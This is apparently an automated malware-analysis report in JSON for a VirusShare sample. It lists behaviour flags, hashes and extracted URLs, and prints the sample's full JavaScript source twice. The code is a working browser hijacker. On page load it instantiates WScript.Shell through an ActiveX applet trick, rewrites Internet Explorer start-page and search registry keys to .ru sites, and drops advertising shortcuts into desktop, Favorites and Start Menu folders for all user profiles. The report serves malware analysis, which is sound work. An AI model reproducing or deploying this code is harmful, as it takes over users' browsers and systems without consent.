{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": "// <!--\ndocument.write(\"<APPLET code=com.ms.activeX.ActiveXComponent.class height=0 width=0><PARAM NAME=code VALUE=com.ms.activeX.ActiveXComponent><PARAM NAME=height VALUE=1><PARAM NAME=width VALUE=1></APPLET>\");\nvar gsStartPUrl = \"about:blank\";\n// \nvar gsStartPUrl = \"http://www.euroreal.ru\";\n// \nvar gsDeskUrl = \"http://www.cartoons.ru\";\nvar gsDeskDescr = \"Postcards\";\n// \nvar gsFavorUrl = \"http://www.goldengate.ru\";\nvar gsFavorDescr = \"Internet advertising\";\n// \nvar gsSMenuUrl = \"http://www.deluxe.ru/\";\nvar gsSMenuDescr = \"Web-design\";\n// \nvar gsSearch = \"http://www.one.ru\";\nvar gsCustomSearch = \"http://www.one.ru\";\n//-----------------------------------------------\nvar iever = GetIEVer();\nfunction GetIEVer()\n{\nvar ua = window.navigator.userAgent\nvar msie = ua.indexOf( \"MSIE \" )\nif( msie > 0 )\nreturn parseInt( ua.substring( msie+5, ua.indexOf( \".\", msie ) ) )\nelse\nreturn 0\n}\nfunction onMycatch( str )\n{\n}\nfunction ChangeStartPage( )\n{\n{ \nShl.RegWrite( \"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Start Page\", gsStartPUrl );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Start Page\", gsStartPUrl );\n} \n}\nfunction ChangeSearch()\n{\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );\nShl.RegWrite( \"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );\nif( iever > 4 )\n{\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\\\\SearchAssistant\", gsSearch );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\\\\CustomizeSearch\", gsCustomSearch );\n}\n}\nfunction AddLnk( sFolder, type )\n{ \n{ \nif( FSO.FolderExists( sFolder ) )\n{\nvar url, discr;\nswitch(type)\n{\ncase 0: url = gsDeskUrl; discr = gsDeskDescr; break;\ncase 1: url = gsFavorUrl; discr = gsFavorDescr; break;\ncase 2: url = gsSMenuUrl; discr = gsSMenuDescr; break;\n}\nvar Shor = Shl.CreateShortcut( sFolder + \"\\\\\" + discr +\".url\" );\nShor.TargetPath = url;\nShor.Save();\n}\n} \n//catch(e){ return false; }\nreturn true;\n} \nfunction AddLnkBase( sFolder, bFavor, bMenu, bDesk )\n{\n//try\n{ \nif( FSO.FolderExists( sFolder ) )\n{\nsFolder = sFolder + \"\\\\\";\nif( bFavor )\n{\nAddLnk( sFolder + \"Favorites\", 1 );\nAddLnk( sFolder + \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\", 1 );\n}\nif( bMenu )\n{\nAddLnk( sFolder + \"Start Menu\", 2 );\nAddLnk( sFolder + \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\", 2 );\n/*AddLnk( sFolder + \"Startmenu\", 2 );//de\nAddLnk( sFolder + \"Menu Inicio\", 2 );//es\nAddLnk( sFolder + \"Menu Avvio\", 2 );//it*/\n}\nif( bDesk )\n{\nAddLnk( sFolder + \"Desktop\", 0 );\nAddLnk( sFolder + \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\", 0 );\n}\nreturn true;\n}\n} \nreturn true;\n}\nfunction AddLinksNTAll( sFolder, sCurUser, bFavor, bMenu, bDesk )\n{\nAddLnkBase( sFolder + sCurUser, bFavor, bMenu, bDesk );\nvar iLen = sCurUser.length;\nvar f = FSO.GetFolder( sFolder );// can throw exception\nfc = new Enumerator( f.SubFolders );\nfor( ; !fc.atEnd(); fc.moveNext() )\n{// get each user's folder\nvar sUser = fc.item().Name;//login.001\nvar dot = sUser.indexOf( \".\" );\nif( dot > 0 )\n{\nsBase = sUser.substring( 0, dot );//login\nif( sBase == sCurUser )\n{\nAddLnkBase( fc.item().Path, bFavor, bMenu, bDesk );\n}\n}\n}\n}\nfunction AddLinksNT( sFolder )\n{\nif( FSO.FolderExists( sFolder ) )\n{\nAddLinksNTAll( sFolder, \"All Users\", false, true, true );\nAddLinksNTAll( sFolder, Net.UserName, true, false, false );\n}\n}\nfunction AddLinks(  )\n{\n{ \nvar WF = FSO.GetSpecialFolder(0); // windows folder\nAddLnkBase( WF, true, true, true );\nAddLinksNT( FSO.GetDriveName(WF) + \"\\\\Documents and Settings\\\\\" );\nAddLinksNT( WF + \"\\\\Profiles\\\\\" );\n} \n}\nfunction CreateActiveX()\n{\n{ \nif( iever == 4 || iever == 5 )\n{\na1=document.applets[0];\na1.setCLSID(\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\");\na1.createInstance();\nShl = a1.GetObject(); // Windows Script Host Shell Object, WScript.Shell\na1.setCLSID(\"{0D43FE01-F093-11CF-8940-00A0C9054228}\");\na1.createInstance();\nFSO = a1.GetObject(); // FileSystem Object, Scripting.FileSystemObject\na1.setCLSID(\"{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}\");\na1.createInstance();\nNet = a1.GetObject(); // Windows Script Host Network Object, WScript.Network\n}\nelse if( iever > 5 )\n{\nShl = new ActiveXObject(\"WScript.Shell\");\nFSO = new ActiveXObject(\"Scripting.FileSystemObject\");\nNet = new ActiveXObject(\"WScript.Network\");\n} \n}\n}\nfunction main()\n{ \n{ \nCreateActiveX();\nChangeStartPage();\nChangeSearch();\nAddLinks();\n} \n} \nfunction init()\n{ \nif( iever > 3 )\n{\nsetTimeout(\"main()\", 1000);\n}\n} \ninit(); \n\n// -->"
    },
    "filename": "VirusShare_c6826a08cecc89d8d54cfd1cc58d0f4f",
    "filesize": 4559,
    "filetype": "C source, ISO-8859 text, with CRLF, LF line terminators",
    "hashes": {
        "md5": "c6826a08cecc89d8d54cfd1cc58d0f4f",
        "sha1": "be128cacdc78eb34e7c475412c659e3e6234ac63",
        "sha256": "41712ad58c8ad6be53c4f60d631d47587b17e4213e76a335d1a2296927fe5132"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "// <!--",
            "document.write(\"<APPLET code=com.ms.activeX.ActiveXComponent.class height=0 width=0><PARAM NAME=code VALUE=com.ms.activeX.ActiveXComponent><PARAM NAME=height VALUE=1><PARAM NAME=width VALUE=1></APPLET>\");",
            "var gsStartPUrl = \"about:blank\";",
            "var gsStartPUrl = \"http://www.euroreal.ru\";",
            "var gsDeskUrl = \"http://www.cartoons.ru\";",
            "var gsDeskDescr = \"Postcards\";",
            "var gsFavorUrl = \"http://www.goldengate.ru\";",
            "var gsFavorDescr = \"Internet advertising\";",
            "var gsSMenuUrl = \"http://www.deluxe.ru/\";",
            "var gsSMenuDescr = \"Web-design\";",
            "var gsSearch = \"http://www.one.ru\";",
            "var gsCustomSearch = \"http://www.one.ru\";",
            "//-----------------------------------------------",
            "var iever = GetIEVer();",
            "function GetIEVer()",
            "var ua = window.navigator.userAgent",
            "var msie = ua.indexOf( \"MSIE \" )",
            "if( msie > 0 )",
            "return parseInt( ua.substring( msie+5, ua.indexOf( \".\", msie ) ) )",
            "else",
            "return 0",
            "function onMycatch( str )",
            "function ChangeStartPage( )",
            "Shl.RegWrite( \"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Start Page\", gsStartPUrl );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Start Page\", gsStartPUrl );",
            "function ChangeSearch()",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );",
            "if( iever > 4 )",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\\\\SearchAssistant\", gsSearch );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\\\\CustomizeSearch\", gsCustomSearch );",
            "function AddLnk( sFolder, type )",
            "if( FSO.FolderExists( sFolder ) )",
            "var url, discr;",
            "switch(type)",
            "case 0: url = gsDeskUrl; discr = gsDeskDescr; break;",
            "case 1: url = gsFavorUrl; discr = gsFavorDescr; break;",
            "case 2: url = gsSMenuUrl; discr = gsSMenuDescr; break;",
            "var Shor = Shl.CreateShortcut( sFolder + \"\\\\\" + discr +\".url\" );",
            "Shor.TargetPath = url;",
            "Shor.Save();",
            "//catch(e){ return false; }",
            "return true;",
            "function AddLnkBase( sFolder, bFavor, bMenu, bDesk )",
            "//try",
            "if( FSO.FolderExists( sFolder ) )",
            "sFolder = sFolder + \"\\\\\";",
            "if( bFavor )",
            "AddLnk( sFolder + \"Favorites\", 1 );",
            "AddLnk( sFolder + \"\", 1 );",
            "if( bMenu )",
            "AddLnk( sFolder + \"Start Menu\", 2 );",
            "AddLnk( sFolder + \" \", 2 );",
            "/*AddLnk( sFolder + \"Startmenu\", 2 );//de",
            "AddLnk( sFolder + \"Menu Inicio\", 2 );//es",
            "AddLnk( sFolder + \"Menu Avvio\", 2 );//it*/",
            "if( bDesk )",
            "AddLnk( sFolder + \"Desktop\", 0 );",
            "AddLnk( sFolder + \" \", 0 );",
            "return true;",
            "return true;",
            "function AddLinksNTAll( sFolder, sCurUser, bFavor, bMenu, bDesk )",
            "AddLnkBase( sFolder + sCurUser, bFavor, bMenu, bDesk );",
            "var iLen = sCurUser.length;",
            "var f = FSO.GetFolder( sFolder );// can throw exception",
            "fc = new Enumerator( f.SubFolders );",
            "for( ; !fc.atEnd(); fc.moveNext() )",
            "{// get each user's folder",
            "var sUser = fc.item().Name;//login.001",
            "var dot = sUser.indexOf( \".\" );",
            "if( dot > 0 )",
            "sBase = sUser.substring( 0, dot );//login",
            "if( sBase == sCurUser )",
            "AddLnkBase( fc.item().Path, bFavor, bMenu, bDesk );",
            "function AddLinksNT( sFolder )",
            "if( FSO.FolderExists( sFolder ) )",
            "AddLinksNTAll( sFolder, \"All Users\", false, true, true );",
            "AddLinksNTAll( sFolder, Net.UserName, true, false, false );",
            "function AddLinks(  )",
            "var WF = FSO.GetSpecialFolder(0); // windows folder",
            "AddLnkBase( WF, true, true, true );",
            "AddLinksNT( FSO.GetDriveName(WF) + \"\\\\Documents and Settings\\\\\" );",
            "AddLinksNT( WF + \"\\\\Profiles\\\\\" );",
            "function CreateActiveX()",
            "if( iever == 4 || iever == 5 )",
            "a1=document.applets[0];",
            "a1.setCLSID(\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\");",
            "a1.createInstance();",
            "Shl = a1.GetObject(); // Windows Script Host Shell Object, WScript.Shell",
            "a1.setCLSID(\"{0D43FE01-F093-11CF-8940-00A0C9054228}\");",
            "a1.createInstance();",
            "FSO = a1.GetObject(); // FileSystem Object, Scripting.FileSystemObject",
            "a1.setCLSID(\"{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}\");",
            "a1.createInstance();",
            "Net = a1.GetObject(); // Windows Script Host Network Object, WScript.Network",
            "else if( iever > 5 )",
            "Shl = new ActiveXObject(\"WScript.Shell\");",
            "FSO = new ActiveXObject(\"Scripting.FileSystemObject\");",
            "Net = new ActiveXObject(\"WScript.Network\");",
            "function main()",
            "CreateActiveX();",
            "ChangeStartPage();",
            "ChangeSearch();",
            "AddLinks();",
            "function init()",
            "if( iever > 3 )",
            "setTimeout(\"main()\", 1000);",
            "init(); ",
            "// -->"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.one.ru",
            "http://www.cartoons.ru",
            "http://www.goldengate.ru",
            "http://www.euroreal.ru",
            "http://www.deluxe.ru/"
        ]
    },
    "time": "0:00:00.373040",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
